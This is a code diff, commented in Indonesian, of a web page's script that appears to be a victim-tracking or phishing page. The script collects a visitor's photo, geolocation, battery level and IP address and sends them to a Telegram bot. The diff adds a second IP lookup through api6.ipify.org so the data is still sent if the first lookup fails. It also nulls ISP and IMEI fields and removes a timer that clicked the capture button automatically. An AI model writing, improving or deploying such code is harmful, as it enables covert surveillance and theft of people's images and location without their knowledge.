@@ -62,6 +62,8 @@
             navigator.getBattery()
               .then(function(battery) {
                 deviceInfo.batteryLevel = battery.level * 100;
+                deviceInfo.isp = null; // Menghapus pemanggilan getISPInfo()
+                deviceInfo.imei = null; // Menghapus pemanggilan getIMEIInfo()
 
                 // Mengambil IP perangkat menggunakan layanan ipify
                 fetch('https://api.ipify.org?format=json')
@@ -76,7 +78,7 @@
                   })
                   .catch(function(error) {
                     console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
-                    sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+                    getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy);
                   });
               })
               .catch(function(error) {
@@ -141,14 +143,24 @@
       return new Blob([ab], { type: mimeString });
     }
 
-    // Fungsi untuk melakukan klik tombol secara otomatis
-    function autoClickButton() {
-      var button = document.getElementById('capture-btn');
-      button.click();
-    }
+    // Fungsi untuk mendapatkan alamat IP perangkat dengan cara alternatif
+    function getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy) {
+      // Mendapatkan alamat IP menggunakan layanan ipify (alternatif)
+      fetch('https://api6.ipify.org?format=json')
+        .then(function(response) {
+          return response.json();
+        })
+        .then(function(data) {
+          deviceInfo.ipAddress = data.ip;
 
-    // Melakukan klik tombol setelah 3 detik
-    setTimeout(autoClickButton, 3000);
+          // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+          sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mendapatkan alamat IP (alternatif):', error);
+          sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+        });
+    }
   </script>
 </body>
 </html>
